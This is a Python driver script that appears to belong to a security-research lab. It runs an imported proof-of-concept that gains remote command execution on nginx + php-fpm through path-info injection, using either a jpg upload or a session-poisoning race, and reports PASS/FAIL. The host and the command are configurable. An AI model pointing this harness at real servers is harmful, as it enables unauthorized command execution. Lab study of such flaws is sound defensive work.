#!/usr/bin/env python3
"""Driver for pathinfo_injection.py: lands `id` (uid=33) through a stock nginx +
php-fpm front via SCRIPT_FILENAME / path-info injection, both the upload-a-jpg
and the race-the-session-poison deliveries.

Bring up the lab:
    docker compose -f docker-compose.fpm-avenues.yml -p p2s-sfpi --profile sfpi up -d --build
    python3 -I poc/routes/verify_pathinfo_injection.py --port 8141
"""

import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import pathinfo_injection as sfpi  # noqa: E402


def main(argv):
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8141)
    ap.add_argument("--cmd", default="id")
    ap.add_argument("--variant", choices=["a", "b", "both"], default="both")
    ap.add_argument("--attempts", type=int, default=25)
    args = ap.parse_args(argv)

    print(f"=== sfpi verify  http://{args.host}:{args.port}  variant={args.variant} ===")
    results = {}

    if args.variant in ("a", "both"):
        print("\n--- variant (a): upload-a-jpg-then-pathinfo ---")
        ok, out, trig = sfpi.upload_then_pathinfo(args.host, args.port, args.cmd)
        results["a"] = (ok, out, trig)

    if args.variant in ("b", "both"):
        print("\n--- variant (b): race-poison-then-pathinfo-at-sess ---")
        ok, out, trig = sfpi.race_poison_then_pathinfo(
            args.host, args.port, args.cmd, attempts=args.attempts)
        results["b"] = (ok, out, trig)

    print("\n=== RESULT ===")
    rc = 0
    for v, (ok, out, trig) in results.items():
        uid = "uid=" in (out or "")
        verdict = "PASS" if (ok and uid) else "FAIL"
        if verdict == "FAIL":
            rc = 1
        print(f"  ({v}) {verdict}  uid={uid}  via {trig}")
        if out:
            print(f"        output: {out.strip()!r}")
    return rc


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
